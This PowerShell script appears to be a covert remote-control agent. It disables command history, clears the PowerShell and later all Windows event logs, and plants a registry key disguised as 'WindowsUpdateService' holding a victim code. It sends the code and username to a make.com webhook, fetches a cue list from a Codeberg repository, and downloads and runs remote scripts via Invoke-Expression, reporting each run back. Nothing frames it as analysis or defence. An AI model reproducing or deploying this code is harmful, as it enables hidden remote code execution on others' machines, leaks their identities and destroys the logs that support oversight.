# Variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$username = ( ( Get-CIMInstance -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
$cacheBuster = Get-Random
$randomcodegen = "6" + (Get-Random -Minimum 10000 -Maximum 99999)
$remotecodeurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/CuesForRemoteHosts.txt?cachebuster=$cacheBuster"
$apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
$regPath = "HKLM:\Software\WindowsUpdateService"
$RelayedValue = "RelayedInfo"

# Ensure the registry key and values exist
if (Test-Path -Path $regPath) {
    $code = (Get-ItemProperty -Path $regPath).Code
    if ($code -notmatch '^6\d{5}$') {
        Set-ItemProperty -Path $regPath -Name 'Code' -Value $randomcodegen
        $code = (Get-ItemProperty -Path $regPath).Code
        $message = "**Code** EDIT on system: **$code**, data: **$RelayedValue**, username: **$username**."
        Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null

    }
    $data = (Get-ItemProperty -Path $regPath).Data
    if ($null -eq $data) {
        Set-ItemProperty -Path $regPath -Name 'Data' -Value $RelayedValue
        $message = "**Data** EDIT on system: **$code**, data: **$RelayedValue**, username: **$username**."
        Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null
    }
} else {
    New-Item -Path $regPath -Force | Out-Null
    New-ItemProperty -Path $regPath -Name 'Code' -PropertyType String -Value $randomcodegen | Out-Null
    New-ItemProperty -Path $regPath -Name 'Data' -PropertyType String -Value $RelayedValue | Out-Null
    $code = (Get-ItemProperty -Path $regPath).Code
    $message = "**Reg** CREATION on system: **$code**, data: **$RelayedValue**, username: **$username**."
    Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null
}

################### Script Starts from here.
$storedData = (Get-ItemProperty -Path $regPath).Data
$storedCode = (Get-ItemProperty -Path $regPath).Code
$webStatus = (Invoke-WebRequest -Uri $remotecodeurl -UseBasicParsing).Content.Split([Environment]::NewLine)
$globalStatus = $null
$localStatus = $null
$globalScripts = @()
$localScripts = @()

foreach ($line in $webStatus) {
    $code, $status = $line -split ' ', 2
    if ($code -eq '000000') {
        $globalStatus = $status
        $globalScripts = $globalStatus -split '/'
    }
    elseif ($code -eq $storedCode) {
        $localStatus = $status
        $localScripts = $localStatus -split '/'
    }
}

# Fetch the contents of the entire repository
$owner = "sempiampi"
$repo = "mavericks"
$path = ""
$uri = "https://codeberg.org/api/v1/repos/$owner/$repo/contents/$path"
$response = Invoke-RestMethod -Uri $uri
$contents = @()
foreach ($item in $response) {
    if ($item.type -eq "dir") {
        $subUri = "https://codeberg.org/api/v1/repos/$owner/$repo/contents/$($item.path)"
        $subResponse = Invoke-RestMethod -Uri $subUri
        foreach ($subItem in $subResponse) {
            if ($subItem.type -eq "file" -and $subItem.name -notlike "*ledger*") {
                $contents += "https://codeberg.org/$owner/$repo/raw/branch/main/$($subItem.path)"
            }
        }
    }
    elseif ($item.type -eq "file" -and $item.name -notlike "*ledger*") {
        $contents += "https://codeberg.org/$owner/$repo/raw/branch/main/$($item.path)"
    }
}

# Execute global scripts first if available and if the current status does not match
if ($globalStatus -and $storedData -ne $globalStatus) {
    foreach ($script in $globalScripts) {
        $scriptFound = $false
        foreach ($action in $contents) {
            if ($action -like "*$script") {
                Invoke-Expression (Invoke-WebRequest -Uri $action -UseBasicParsing).Content
                $message = "MASTER command: **$script** EXEC on **$storedCode**, username: **$username**."
                Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null                
                $scriptFound = $true
                break
            }
        }       
        if (-not $scriptFound) {
            if ($data -ne "InvalidCue") {
                $message = "MASTER command: **$script** was not found in the Codeberg repository for **$storedCode**, username: $username."
                Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null           
                Set-ItemProperty -Path $regPath -Name 'Data' -Value 'InvalidCue'
            }
        }
    }    
    Set-ItemProperty -Path $regPath -Name 'Data' -Value $globalStatus
}

# Execute local scripts if available and changed
if ($localStatus -and $localStatus -ne $storedData) {
    $currentValue = $storedData
    $newValue = $localStatus
    $allScriptsFound = $true
    foreach ($script in $localScripts) {
        $scriptFound = $false
        foreach ($action in $contents) {
            if ($action -like "*$script") {
                try {
                    Invoke-Expression (Invoke-WebRequest -Uri $action -UseBasicParsing).Content | Out-Null
                } catch {}
                $scriptFound = $true
                break
            }
        }
        if (-not $scriptFound) {
            $allScriptsFound = $false
            $message = "Script: **$script** was not found in the repo. System's code: **$storedCode**, username: **$username**."
            Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null
        }
    }
    if ($allScriptsFound) {
        Set-ItemProperty -Path $regPath -Name 'Data' -Value $newValue | Out-Null
        $newValue = (Get-ItemProperty -Path $regPath).Data
        $message = "Status of **$storedCode** changed from **$currentValue** to **$newValue**, username: **$username**"
        Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null
        Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log } | Out-Null
    }
}